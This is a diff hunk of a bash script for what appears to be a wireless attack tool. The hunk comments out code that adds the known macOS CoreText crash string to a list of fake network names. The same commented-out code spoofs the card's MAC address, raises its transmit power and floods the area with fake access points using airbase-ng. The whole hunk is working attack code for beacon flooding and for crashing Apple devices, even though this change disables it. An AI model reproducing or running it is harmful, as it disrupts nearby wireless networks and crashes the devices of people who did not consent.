@@ -140,40 +140,40 @@ if [ $MANGLE = 1 ] 2> /dev/null											#Get list of essids
 		if [ $FILE -z ] 2> /dev/null									
 		then
 			echo
-			echo $BLU" [*] Please enter AP names seperated by '*' eg$RED one$BLU*"$RED"two$BLU*"$RED"three"
+			#echo $BLU" [*] Please enter AP names seperated by '*' eg$RED one$BLU*"$RED"two$BLU*"$RED"three"
 			read -p " > "$RED LIST
 			echo $LIST | tr '*' '\n' > tmpe
 			LIST='tmpe'
 		fi
 fi
 																		#Add OsX coretext exploit into essids
-if [ $OSX = 1 ] 2> /dev/null
-then
-	echo "$(cat $LIST)" > tmpe
-	echo 'سمَـَّوُوُحخ ̷̴̐خ ̷̴̐خ ̷̴̐خ امارتيخ ̷̴̐خ' >> tmpe
-	LIST='tmpe'
-fi																		#Start monitor mode and boost power on wireless card
-																		
-echo $GRN;MON1=$(airmon-ng start $NIC | grep monitor | cut -d ' ' -f 5 | head -c -2);echo " [*] Started $NIC monitor on $MON1"
-echo
-echo $GRN" [*] Changing MAC and attempting to boost power on $NIC" 
-ifconfig $NIC down
-macchanger -a $NIC 2> /dev/null
-sleep 0.5
-iwconfig $NIC txpower 30 2> /dev/null
-sleep 0.5
-ifconfig $NIC up
-ifconfig $MON1 down
-macchanger -a $MON1 2> /dev/null
-BSSID='00:'
-ifconfig $MON1 up                             
-fbssids																	#Launch APs with airbase-ng
-
-airbase-ng -i $MON1 -0 -I 50 -P --essids $LIST --bssids bssids -x 200 $MON1 | grep 'fff'&
-sleep 0.5
-echo
-echo $GRN" [*] APs Launched:"$RED
-cat $LIST | tr '\n' " "
-echo
-read -p $GRN" [*] Press Enter or Ctrl+C to clean up"
-fexit
+#if [ $OSX = 1 ] 2> /dev/null
+#then
+#	echo "$(cat $LIST)" > tmpe
+#	echo 'سمَـَّوُوُحخ ̷̴̐خ ̷̴̐خ ̷̴̐خ امارتيخ ̷̴̐خ' >> tmpe
+#	LIST='tmpe'
+#fi																		#Start monitor mode and boost power on wireless card
+#																		
+#echo $GRN;MON1=$(airmon-ng start $NIC | grep monitor | cut -d ' ' -f 5 | head -c -2);echo " [*] Started $NIC monitor on $MON1"
+#echo
+#echo $GRN" [*] Changing MAC and attempting to boost power on $NIC" 
+#ifconfig $NIC down
+#macchanger -a $NIC 2> /dev/null
+#sleep 0.5
+#iwconfig $NIC txpower 30 2> /dev/null
+#sleep 0.5
+#ifconfig $NIC up
+#ifconfig $MON1 down
+#macchanger -a $MON1 2> /dev/null
+#BSSID='00:'
+#ifconfig $MON1 up                             
+#fbssids																	#Launch APs with airbase-ng
+#
+#airbase-ng -i $MON1 -0 -I 50 -P --essids $LIST --bssids bssids -x 200 $MON1 | grep 'fff'&
+#sleep 0.5
+#echo
+#echo $GRN" [*] APs Launched:"$RED
+#cat $LIST | tr '\n' " "
+#echo
+#read -p $GRN" [*] Press Enter or Ctrl+C to clean up"
+#fexit
